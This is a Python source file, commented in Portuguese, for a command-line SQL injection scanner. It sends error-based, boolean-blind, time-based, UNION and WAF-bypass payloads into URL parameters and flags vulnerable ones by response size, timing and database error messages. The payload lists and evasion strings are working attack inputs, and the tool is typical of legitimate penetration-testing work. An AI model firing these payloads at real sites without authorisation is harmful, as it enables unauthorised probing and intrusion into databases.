#!/usr/bin/env python3
"""Modulo de deteccao de SQL Injection (SQLi).

Testa se o servidor e vulneravel a SQL injection via parametros de URL:

  Error-based:
    - Payloads que geram erros SQL no response body
    - Detecta MySQL, PostgreSQL, MSSQL, Oracle, SQLite

  Blind (boolean):
    - Pares true/false: se responses diferem consistentemente (3x)
    - Vulneravel so se diff > threshold em todas as 3 tentativas

  Blind (time-based):
    - Payloads com SLEEP/WAITFOR/pg_sleep
    - Vulneravel se time > baseline * 2 AND > time_threshold

  UNION:
    - Incrementa numero de NULLs
    - Detecta "wrong number of columns" vs resposta anormal

  Bypass:
    - Payloads de WAF evasion (comments, encoding, case)
    - Mesma deteccao do error-based
"""

import argparse
import logging
import re
import time
from dataclasses import asdict, dataclass
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    print_exploit_info,
    print_json,
    run_concurrent,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)
from mytools.web.secondorder import get_verify_payload, verify_positive

logger = logging.getLogger("mytools.sqliscan")

# ---------------------------------------------------------------------------
# Payload loading
# ---------------------------------------------------------------------------


_ERROR_PAYLOADS_DEFAULT: list[str] = [
    "'",
    '"',
    "')",
    "))",
    "' OR '1'='1",
    '" OR "1"="1',
    "1' AND 1=1--",
    "1' AND 1=2--",
    "') AND ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
]

_BLIND_BOOLEAN_PAIRS_DEFAULT: list[list[str]] = [
    ["' AND 1=1--", "' AND 1=2--"],
    ["' OR 'a'='a'--", "' OR 'a'='b'--"],
    ["1 AND 1=1", "1 AND 1=2"],
    ["' AND 'x'='x'--", "' AND 'x'='y'--"],
    ["1' AND SUBSTRING(@@version,1,1)='5'--", "1' AND SUBSTRING(@@version,1,1)='X'--"],
]

_TIME_PAYLOADS_DEFAULT: list[str] = [
    "' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "'; SELECT pg_sleep(3)--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
]

_UNION_PAYLOADS_DEFAULT: list[str] = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
]

_BYPASS_PAYLOADS_DEFAULT: list[str] = [
    "' /*!50000OR*/ 1=1--",
    "'%20OR%201=1--",
    "'\tOR\t1=1--",
    "'/**/OR/**/1=1--",
    "' UNION/**/SELECT NULL--",
    "1'/*!50000UNION*//*!50000SELECT*/NULL--",
]

_INJECTION_PARAMS_DEFAULT: list[str] = [
    "id",
    "q",
    "search",
    "page",
    "name",
    "user",
    "cat",
    "item",
    "product",
    "order",
    "sort",
    "type",
    "action",
    "debug",
    "test",
    "input",
    "cmd",
    "file",
    "path",
]


def _load_payloads() -> dict[str, object]:
    from mytools.data import load_payloads

    return load_payloads(
        "web",
        "sqli",
        default={
            "error_payloads": _ERROR_PAYLOADS_DEFAULT,
            "blind_boolean_pairs": _BLIND_BOOLEAN_PAIRS_DEFAULT,
            "time_payloads": _TIME_PAYLOADS_DEFAULT,
            "union_payloads": _UNION_PAYLOADS_DEFAULT,
            "bypass_payloads": _BYPASS_PAYLOADS_DEFAULT,
            "injection_params": _INJECTION_PARAMS_DEFAULT,
        },
    )


def _get_error_payloads() -> list[str]:
    data = _load_payloads()
    raw = data.get("error_payloads", _ERROR_PAYLOADS_DEFAULT)
    return list(raw) if isinstance(raw, list) else _ERROR_PAYLOADS_DEFAULT


def _get_blind_boolean_pairs() -> list[list[str]]:
    data = _load_payloads()
    pairs = data.get("blind_boolean_pairs", _BLIND_BOOLEAN_PAIRS_DEFAULT)
    if isinstance(pairs, list) and pairs and isinstance(pairs[0], list):
        return pairs  # type: ignore[return-value]
    return _BLIND_BOOLEAN_PAIRS_DEFAULT


def _get_time_payloads() -> list[str]:
    data = _load_payloads()
    raw = data.get("time_payloads", _TIME_PAYLOADS_DEFAULT)
    return list(raw) if isinstance(raw, list) else _TIME_PAYLOADS_DEFAULT


def _get_union_payloads() -> list[str]:
    data = _load_payloads()
    raw = data.get("union_payloads", _UNION_PAYLOADS_DEFAULT)
    return list(raw) if isinstance(raw, list) else _UNION_PAYLOADS_DEFAULT


def _get_bypass_payloads() -> list[str]:
    data = _load_payloads()
    raw = data.get("bypass_payloads", _BYPASS_PAYLOADS_DEFAULT)
    return list(raw) if isinstance(raw, list) else _BYPASS_PAYLOADS_DEFAULT


def _get_injection_params() -> list[str]:
    data = _load_payloads()
    raw = data.get("injection_params", _INJECTION_PARAMS_DEFAULT)
    return list(raw) if isinstance(raw, list) else _INJECTION_PARAMS_DEFAULT


# ---------------------------------------------------------------------------
# DB error patterns
# ---------------------------------------------------------------------------

_DB_ERROR_PATTERNS_DEFAULT: dict[str, list[re.Pattern[str]]] = {
    "mysql": [
        re.compile(r"You have an error in your SQL syntax", re.I),
        re.compile(r"MySqlException", re.I),
        re.compile(r"mysql_fetch", re.I),
        re.compile(r"supplied argument is not a valid MySQL", re.I),
        re.compile(r"Warning: mysql", re.I),
        re.compile(r"MySQLSyntaxErrorException", re.I),
        re.compile(r"com\.mysql\.jdbc", re.I),
    ],
    "postgresql": [
        re.compile(r"PostgreSQL.*ERROR", re.I),
        re.compile(r"PG::SyntaxError", re.I),
        re.compile(r"pg_query", re.I),
        re.compile(r"valid PostgreSQL result", re.I),
        re.compile(r"unterminated quoted string", re.I),
        re.compile(r"PSQLException", re.I),
    ],
    "mssql": [
        re.compile(r"Driver.* SQL Server", re.I),
        re.compile(r"Unclosed quotation mark", re.I),
        re.compile(r"ODBC SQL Server", re.I),
        re.compile(r"Microsoft OLE DB", re.I),
        re.compile(r"Incorrect syntax near", re.I),
        re.compile(r"SqlException", re.I),
        re.compile(r"System\.Data\.SqlClient", re.I),
    ],
    "oracle": [
        re.compile(r"ORA-[0-9]{4,5}", re.I),
        re.compile(r"Oracle error", re.I),
        re.compile(r"Oracle.*Driver", re.I),
        re.compile(r"quoted string not properly terminated", re.I),
        re.compile(r"ORA-01756", re.I),
    ],
    "sqlite": [
        re.compile(r"SQLite/JDBCDriver", re.I),
        re.compile(r"SQLITE_ERROR", re.I),
        re.compile(r"unrecognized token", re.I),
        re.compile(r"SQLite3::", re.I),
        re.compile(r"sqlite3\.OperationalError", re.I),
    ],
}


def _load_db_error_patterns() -> dict[str, list[re.Pattern[str]]]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "sqli", default={"db_error_patterns": _DB_ERROR_PATTERNS_DEFAULT}
    )
    raw = data.get("db_error_patterns", _DB_ERROR_PATTERNS_DEFAULT)
    if not isinstance(raw, dict):
        return _DB_ERROR_PATTERNS_DEFAULT
    compiled: dict[str, list[re.Pattern[str]]] = {}
    for db_name, pats in raw.items():
        if not isinstance(pats, list):
            continue
        compiled[db_name] = [
            p if isinstance(p, re.Pattern) else re.compile(p, re.I) for p in pats
        ]
    return compiled or _DB_ERROR_PATTERNS_DEFAULT


_DB_ERROR_PATTERNS = _load_db_error_patterns()


def _detect_db_error(body: bytes) -> str:
    """Detecta se o body contem erro SQL de algum banco. Retorna nome do DB ou vazio."""
    text = body.decode("utf-8", errors="ignore")
    for db_name, patterns in _DB_ERROR_PATTERNS.items():
        for pat in patterns:
            if pat.search(text):
                return db_name
    return ""


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class SQLiAttempt:
    """Tentativa individual de SQL injection."""

    technique: str
    category: str
    injection_point: str
    url: str
    payload: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    time_baseline: float
    time_test: float
    db_detected: str
    content_match: bool
    timing_match: bool
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class SQLiResult:
    """Resultado consolidado do scan de SQL Injection."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[SQLiAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

Baseline = tuple[int, int, bytes, float]


def _build_inject_url(base_url: str, param: str, payload: str) -> str:
    """Constroi URL com payload injetado no param especificado."""
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


async def _inject(
    client: httpx.AsyncClient,
    base_url: str,
    param: str,
    payload: str,
) -> tuple[int, int, float] | None:
    """Envia request com payload injetado. Retorna (status, size, elapsed) ou None."""
    url = _build_inject_url(base_url, param, payload)
    try:
        t0 = time.monotonic()
        resp = await client.get(url, follow_redirects=True)
        elapsed = time.monotonic() - t0
        return resp.status_code, len(resp.content), elapsed
    except httpx.RequestError:
        return None


def _make_attempt(
    *,
    technique: str,
    category: str,
    injection_point: str,
    url: str,
    payload: str,
    baseline: Baseline,
    status_test: int = 0,
    size_test: int = 0,
    time_test: float = 0.0,
    db_detected: str = "",
    content_match: bool = False,
    timing_match: bool = False,
    vulnerable: bool = False,
    details: str = "",
    error: str = "",
) -> SQLiAttempt:
    """Factory para SQLiAttempt com exploit padrao."""
    b_status, b_size, _, b_time = baseline
    exploit = ""
    tool = ""
    if vulnerable:
        exploit = f"curl '{url}'"
        tool = "curl"
    return SQLiAttempt(
        technique=technique,
        category=category,
        injection_point=injection_point,
        url=url,
        payload=payload,
        status_baseline=b_status,
        status_test=status_test,
        size_baseline=b_size,
        size_test=size_test,
        time_baseline=b_time,
        time_test=time_test,
        db_detected=db_detected,
        content_match=content_match,
        timing_match=timing_match,
        vulnerable=vulnerable,
        details=details,
        error=error,
        exploit=exploit,
        tool=tool,
    )


# ---------------------------------------------------------------------------
# Baseline
# ---------------------------------------------------------------------------


async def _test_baseline(
    client: httpx.AsyncClient,
    url: str,
) -> Baseline:
    """Envia requisicao baseline."""
    try:
        t0 = time.monotonic()
        resp = await client.get(url, follow_redirects=True)
        elapsed = time.monotonic() - t0
        return resp.status_code, len(resp.content), resp.content, elapsed
    except httpx.RequestError:
        return 0, 0, b"", 0.0


# ---------------------------------------------------------------------------
# Param extraction
# ---------------------------------------------------------------------------


def _extract_params(url: str, forced_param: str | None = None) -> list[str]:
    """Extrai params da URL ou usa injection_params default."""
    if forced_param:
        return [forced_param]
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if qs:
        return list(qs.keys())
    return _get_injection_params()[:5]


# ---------------------------------------------------------------------------
# Category tests
# ---------------------------------------------------------------------------


async def _test_error(
    client: httpx.AsyncClient,
    url: str,
    params: list[str],
    baseline: Baseline,
    payloads: list[str] | None = None,
) -> list[SQLiAttempt]:
    """Error-based SQL injection detection."""
    attempts: list[SQLiAttempt] = []
    error_payloads = payloads or _get_error_payloads()
    _b_status, _b_size, _, _ = baseline

    for param in params:
        for payload in error_payloads:
            result = await _inject(client, url, param, payload)
            if result is None:
                attempts.append(
                    _make_attempt(
                        technique="error",
                        category="error",
                        injection_point=param,
                        url=url,
                        payload=payload,
                        baseline=baseline,
                        error="Request failed",
                    )
                )
                continue

            status, size, _ = result
            db = ""
            body = b""
            inject_url = _build_inject_url(url, param, payload)
            try:
                resp = await client.get(inject_url, follow_redirects=True)
                body = resp.content
                db = _detect_db_error(body)
                status = resp.status_code
                size = len(body)
            except httpx.RequestError:
                pass

            content_match = bool(db)
            vulnerable = content_match

            details = f"DB detectado: {db}" if db else f"Status {status}, Size {size}"

            # Second-order verification for error-based detection
            if db:
                verify = get_verify_payload("sqliscan", "error")
                if verify:
                    v_payload, v_indicators = verify
                    v_url = _build_inject_url(url, param, v_payload)
                    confirmed, v_found = await verify_positive(
                        client, v_url, v_indicators
                    )
                    if not confirmed:
                        db = ""
                        content_match = False
                        vulnerable = False
                        details += f" [2nd-order failed: {v_found or 'no match'}]"
                    else:
                        details += f" [2nd-order confirmed: {v_found}]"

            attempts.append(
                _make_attempt(
                    technique="error",
                    category="error",
                    injection_point=param,
                    url=inject_url,
                    payload=payload,
                    baseline=baseline,
                    status_test=status,
                    size_test=size,
                    db_detected=db,
                    content_match=content_match,
                    vulnerable=vulnerable,
                    details=details,
                )
            )

    return attempts


async def _test_boolean_blind(
    client: httpx.AsyncClient,
    url: str,
    params: list[str],
    baseline: Baseline,
    pairs: list[list[str]] | None = None,
    repeats: int = 3,
) -> list[SQLiAttempt]:
    """Boolean-based blind SQLi. Repete cada par 3x e verifica consistencia."""
    attempts: list[SQLiAttempt] = []
    boolean_pairs = pairs or _get_blind_boolean_pairs()
    _b_status, _b_size, _, _ = baseline
    size_diff_threshold = 100

    for param in params:
        for true_payload, false_payload in boolean_pairs:
            true_sizes: list[int] = []
            false_sizes: list[int] = []
            last_true_result: tuple[int, int, float] | None = None
            _build_inject_url(url, param, true_payload)
            _build_inject_url(url, param, false_payload)

            for _ in range(repeats):
                t_res = await _inject(client, url, param, true_payload)
                f_res = await _inject(client, url, param, false_payload)
                if t_res:
                    true_sizes.append(t_res[1])
                    last_true_result = t_res
                if f_res:
                    false_sizes.append(f_res[1])

            if len(true_sizes) == repeats and len(false_sizes) == repeats:
                diffs = [
                    abs(t - f) for t, f in zip(true_sizes, false_sizes, strict=False)
                ]
                consistent = all(d > size_diff_threshold for d in diffs)
            else:
                diffs = []
                consistent = False

            st = last_true_result[0] if last_true_result else 0
            sz = last_true_result[1] if last_true_result else 0
            tm = last_true_result[2] if last_true_result else 0.0

            details = (
                f"Boolean diff consistente ({repeats}x): {diffs}"
                if consistent
                else "Diff inconsistente entre true/false"
            )

            attempts.append(
                _make_attempt(
                    technique="boolean_blind",
                    category="blind",
                    injection_point=param,
                    url=url,
                    payload=true_payload,
                    baseline=baseline,
                    status_test=st,
                    size_test=sz,
                    time_test=tm,
                    content_match=consistent,
                    vulnerable=consistent,
                    details=details,
                )
            )

    return attempts


async def _test_time_blind(
    client: httpx.AsyncClient,
    url: str,
    params: list[str],
    baseline: Baseline,
    payloads: list[str] | None = None,
    time_threshold: float = 1.5,
) -> list[SQLiAttempt]:
    """Time-based blind SQLi."""
    attempts: list[SQLiAttempt] = []
    time_payloads_list = payloads or _get_time_payloads()
    _b_status, _b_size, _, b_time = baseline

    for param in params:
        for payload in time_payloads_list:
            result = await _inject(client, url, param, payload)
            if result is None:
                attempts.append(
                    _make_attempt(
                        technique="time_blind",
                        category="blind",
                        injection_point=param,
                        url=url,
                        payload=payload,
                        baseline=baseline,
                        error="Request failed",
                    )
                )
                continue

            status, size, elapsed = result
            timing_match = (elapsed > b_time * 2) and (elapsed > time_threshold)

            details = (
                f"Timing: {elapsed:.2f}s vs baseline {b_time:.2f}s (threshold {time_threshold}s)"
                if timing_match
                else f"Timing: {elapsed:.2f}s vs baseline {b_time:.2f}s (below threshold)"
            )

            attempts.append(
                _make_attempt(
                    technique="time_blind",
                    category="blind",
                    injection_point=param,
                    url=url,
                    payload=payload,
                    baseline=baseline,
                    status_test=status,
                    size_test=size,
                    time_test=elapsed,
                    timing_match=timing_match,
                    vulnerable=timing_match,
                    details=details,
                )
            )

    return attempts


async def _test_union(
    client: httpx.AsyncClient,
    url: str,
    params: list[str],
    baseline: Baseline,
    payloads: list[str] | None = None,
) -> list[SQLiAttempt]:
    """UNION-based SQLi detection."""
    attempts: list[SQLiAttempt] = []
    union_payloads_list = payloads or _get_union_payloads()
    _b_status, b_size, _, _ = baseline

    for param in params:
        wrong_columns_seen = False
        for payload in union_payloads_list:
            if wrong_columns_seen:
                continue

            result = await _inject(client, url, param, payload)
            if result is None:
                attempts.append(
                    _make_attempt(
                        technique="union",
                        category="union",
                        injection_point=param,
                        url=url,
                        payload=payload,
                        baseline=baseline,
                        error="Request failed",
                    )
                )
                continue

            status, size, _ = result
            inject_url = _build_inject_url(url, param, payload)
            body = b""
            try:
                resp = await client.get(inject_url, follow_redirects=True)
                body = resp.content
                status = resp.status_code
                size = len(body)
            except httpx.RequestError:
                pass

            text = body.decode("utf-8", errors="ignore").lower()
            is_wrong_columns = any(
                phrase in text
                for phrase in [
                    "wrong number of columns",
                    "column count doesn't match",
                    "select list has a different number of terms",
                    "the used select statements have a different number of columns",
                    "operands should have",
                ]
            )

            if is_wrong_columns:
                wrong_columns_seen = True
                attempts.append(
                    _make_attempt(
                        technique="union",
                        category="union",
                        injection_point=param,
                        url=inject_url,
                        payload=payload,
                        baseline=baseline,
                        status_test=status,
                        size_test=size,
                        vulnerable=False,
                        details="Wrong number of columns (precisa mais NULLs)",
                    )
                )
            else:
                size_diff = abs(size - b_size)
                db = _detect_db_error(body)
                vulnerable = (size_diff > 200) and bool(db)
                details = (
                    f"UNION possivel: {size_diff} bytes diff"
                    if not vulnerable
                    else f"DB detectado via UNION: {db}"
                )
                attempts.append(
                    _make_attempt(
                        technique="union",
                        category="union",
                        injection_point=param,
                        url=inject_url,
                        payload=payload,
                        baseline=baseline,
                        status_test=status,
                        size_test=size,
                        db_detected=db,
                        content_match=bool(db),
                        vulnerable=vulnerable,
                        details=details,
                    )
                )

    return attempts


async def _test_bypass(
    client: httpx.AsyncClient,
    url: str,
    params: list[str],
    baseline: Baseline,
    payloads: list[str] | None = None,
) -> list[SQLiAttempt]:
    """WAF bypass SQLi — mesma deteccao do error-based."""
    attempts: list[SQLiAttempt] = []
    bypass_payloads_list = payloads or _get_bypass_payloads()
    _b_status, _b_size, _, _ = baseline

    for param in params:
        for payload in bypass_payloads_list:
            inject_url = _build_inject_url(url, param, payload)
            body = b""
            status = 0
            size = 0
            try:
                resp = await client.get(inject_url, follow_redirects=True)
                body = resp.content
                status = resp.status_code
                size = len(body)
            except httpx.RequestError:
                attempts.append(
                    _make_attempt(
                        technique="bypass",
                        category="bypass",
                        injection_point=param,
                        url=inject_url,
                        payload=payload,
                        baseline=baseline,
                        error="Request failed",
                    )
                )
                continue

            db = _detect_db_error(body)
            content_match = bool(db)
            vulnerable = content_match

            details = (
                f"Bypass DB detectado: {db}"
                if db
                else f"Bypass status {status}, Size {size}"
            )

            attempts.append(
                _make_attempt(
                    technique="bypass",
                    category="bypass",
                    injection_point=param,
                    url=inject_url,
                    payload=payload,
                    baseline=baseline,
                    status_test=status,
                    size_test=size,
                    db_detected=db,
                    content_match=content_match,
                    vulnerable=vulnerable,
                    details=details,
                )
            )

    return attempts


# ---------------------------------------------------------------------------
# run_scan
# ---------------------------------------------------------------------------


async def run_scan(
    url: str,
    category: str = "all",
    timeout: float = 10.0,
    concurrency: int = 5,
    time_threshold: float = 1.5,
    output_file: str | None = None,
    json_output: bool = False,
) -> SQLiResult:
    """Executa o scan de SQL Injection contra a URL alvo."""
    parsed = urlparse(url)
    if not parsed.scheme:
        url = f"http://{url}"
        parsed = urlparse(url)

    tls = parsed.scheme == "https"

    async with create_async_client(
        user_agent="MyTools/sqliscan",
        timeout=timeout,
    ) as client:
        baseline = await _test_baseline(client, url)

        if baseline[0] == 0:
            return SQLiResult(
                target=url,
                baseline_status=0,
                baseline_size=0,
                tls=tls,
                attempts=[],
                vulnerable_techniques=[],
                blocked_techniques=[],
                issues=["Falha ao conectar no alvo"],
                overall_status="error",
            )

        b_status, b_size, _b_body, b_time = baseline
        logger.info("Baseline: %d (%d bytes, %.2fs)", b_status, b_size, b_time)

        params = _extract_params(url)
        logger.info("Params detectados: %s", params)

        valid_categories = {"error", "blind", "union", "bypass", "all"}
        if category not in valid_categories:
            return SQLiResult(
                target=url,
                baseline_status=b_status,
                baseline_size=b_size,
                tls=tls,
                attempts=[],
                vulnerable_techniques=[],
                blocked_techniques=[],
                issues=[f"Categoria desconhecida: {category}"],
                overall_status="error",
            )

        coros = []

        if category in ("all", "error"):
            coros.append(_test_error(client, url, params, baseline))
        if category in ("all", "blind"):
            coros.append(_test_boolean_blind(client, url, params, baseline))
            coros.append(
                _test_time_blind(
                    client,
                    url,
                    params,
                    baseline,
                    time_threshold=time_threshold,
                )
            )
        if category in ("all", "union"):
            coros.append(_test_union(client, url, params, baseline))
        if category in ("all", "bypass"):
            coros.append(_test_bypass(client, url, params, baseline))

        results = await run_concurrent(coros, concurrency)

        all_attempts: list[SQLiAttempt] = []
        for r in results:
            if isinstance(r, list):
                all_attempts.extend(r)

    vulnerable_techniques: set[str] = set()
    blocked_techniques: set[str] = set()
    issues: list[str] = []

    for att in all_attempts:
        if att.vulnerable:
            vulnerable_techniques.add(att.technique)

    vuln_count = sum(1 for a in all_attempts if a.vulnerable)
    if vuln_count > 0:
        issues.append(f"{vuln_count} payload(s) SQLi confirmado(s)")

    if not vulnerable_techniques:
        issues.append("Nenhuma SQL injection detectada")

    overall = "vulnerable" if vulnerable_techniques else "secure"

    return SQLiResult(
        target=url,
        baseline_status=b_status,
        baseline_size=b_size,
        tls=tls,
        attempts=all_attempts,
        vulnerable_techniques=sorted(vulnerable_techniques),
        blocked_techniques=sorted(blocked_techniques),
        issues=issues,
        overall_status=overall,
    )


# ---------------------------------------------------------------------------
# print_results
# ---------------------------------------------------------------------------


def print_results(result: SQLiResult) -> None:
    """Exibe os resultados do scan formatados."""
    print()
    print(color("=" * 60, Cyber.CYAN))
    print(color("  SQL INJECTION SCANNER", Cyber.CYAN))
    print(color("=" * 60, Cyber.CYAN))
    print(color(f"  Target: {result.target}", Cyber.WHITE))
    print(
        color(
            f"  Baseline: {result.baseline_status} ({result.baseline_size} bytes)",
            Cyber.GRAY,
        )
    )
    print(color(f"  TLS: {'Sim' if result.tls else 'Nao'}", Cyber.GRAY))

    status_color = Cyber.RED if result.overall_status == "vulnerable" else Cyber.GREEN
    print(color(f"\n  Status: {result.overall_status.upper()}", status_color))

    if result.vulnerable_techniques:
        print(
            color(
                f"\n  Tecnicas vulneraveis: {', '.join(result.vulnerable_techniques)}",
                Cyber.RED,
            )
        )

    vuln_attempts = [a for a in result.attempts if a.vulnerable]
    if vuln_attempts:
        print(color("\n  [VULNERAVEL]", Cyber.RED))
        seen: set[str] = set()
        for a in vuln_attempts:
            key = f"{a.technique}:{a.injection_point}"
            if key in seen:
                continue
            seen.add(key)
            db_info = f" (DB: {a.db_detected})" if a.db_detected else ""
            print(
                color(
                    f"    - {a.technique} via {a.injection_point}{db_info}: {a.details}",
                    Cyber.RED,
                )
            )
            print_exploit_info(a.exploit, a.tool)

    if result.issues:
        print(color("\n  Observacoes:", Cyber.YELLOW))
        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))

    print(color("=" * 60, Cyber.CYAN))


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

banner_art = create_banner(
    r"""
    ____  __  ___   _____          __
   / __ \/ / / / | / /_  /___  __/ /____
  / / / / / / /| |/ / / / __ \/ __ `/ __ \
 / /_/ / /_/ / >  </ / / /_/ / /_/ / / / /
 \___\_\____//_/|_/_/  \____/\__,_/_/ /_/
    """,
    "SQL Injection Scanner — error, blind, union, bypass detection",
)


# ---------------------------------------------------------------------------
# build_parser
# ---------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    """Monta parser CLI para mytools-sqli."""
    parser = argparse.ArgumentParser(
        prog="mytools-sqli",
        description="SQL Injection Scanner — error, blind, union, bypass.",
    )
    parser.add_argument("url", nargs="?", help="URL alvo para teste")
    parser.add_argument(
        "-c",
        "--category",
        choices=["error", "blind", "union", "bypass", "all"],
        default="all",
        help="Categoria de testes (default: all)",
    )
    parser.add_argument(
        "--param",
        help="Param name para forcar (override auto-detect)",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Requisicoes simultaneas (default: 5)",
    )
    parser.add_argument(
        "--time-threshold",
        type=float,
        default=1.5,
        help="Threshold em segundos para time-based blind (default: 1.5)",
    )
    add_common_args(parser, "web")
    return parser


# ---------------------------------------------------------------------------
# run_once
# ---------------------------------------------------------------------------


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan SQLi a partir de argumentos parseados."""
    init_scanner(args)
    logger.info("SQLi scan iniciado para %s", args.url)

    result = safe_asyncio_run(
        run_scan(
            url=args.url,
            category=getattr(args, "category", "all"),
            timeout=getattr(args, "timeout", 10.0),
            concurrency=getattr(args, "concurrency", 5),
            time_threshold=getattr(args, "time_threshold", 1.5),
            output_file=getattr(args, "output", None),
            json_output=getattr(args, "json_output", False),
        ),
    )

    if getattr(args, "json_output", False):
        print_json(asdict(result))
    else:
        print_results(result)

    if getattr(args, "output", None):
        write_output(args.output, asdict(result))

    return 0 if result.overall_status != "error" else 1


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None)),
        prompt="sqli> ",
        description="SQL Injection Scanner interativo.",
        example="https://target.com/search?q=test",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com/search?q=test\n"
            "  https://target.com/search?q=test -c error\n"
            "  https://target.com/search?q=test -c blind\n"
            "  https://target.com/search?q=test --time-threshold 2.0\n"
            "  https://target.com/search?q=test --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
